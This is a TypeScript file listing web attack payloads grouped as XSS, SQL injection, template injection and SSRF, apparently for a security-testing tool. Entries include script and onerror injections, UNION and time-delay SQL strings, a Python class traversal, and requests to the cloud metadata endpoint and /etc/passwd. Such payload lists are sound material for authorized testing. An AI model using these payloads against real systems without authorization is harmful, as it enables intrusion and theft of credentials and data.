export interface PayloadGroup {
  name: string;
  items: string[];
}

export const payloadLibrary: PayloadGroup[] = [
  {
    name: 'XSS',
    items: [
      `<script>alert(document.domain)</script>`,
      `"><img src=x onerror=alert(1)>`,
      `javascript:alert(1)`,
      `'"><svg/onload=alert(1)>`,
      `{{constructor.constructor('alert(1)')()}}`,
    ],
  },
  {
    name: 'SQLi',
    items: [
      `' OR '1'='1`,
      `' OR '1'='1' -- -`,
      `1' ORDER BY 10-- -`,
      `' UNION SELECT NULL,NULL,NULL-- -`,
      `1;WAITFOR DELAY '0:0:5'--`,
    ],
  },
  {
    name: 'SSTI',
    items: [
      `{{7*7}}`,
      `${'${7*7}'}`,
      `#{7*7}`,
      `<%= 7*7 %>`,
      `{{''.__class__.__mro__[1].__subclasses__()}}`,
    ],
  },
  {
    name: 'SSRF',
    items: [
      `http://127.0.0.1:80/`,
      `http://169.254.169.254/latest/meta-data/`,
      `http://localhost/admin`,
      `file:///etc/passwd`,
      `http://[::1]/`,
    ],
  },
];
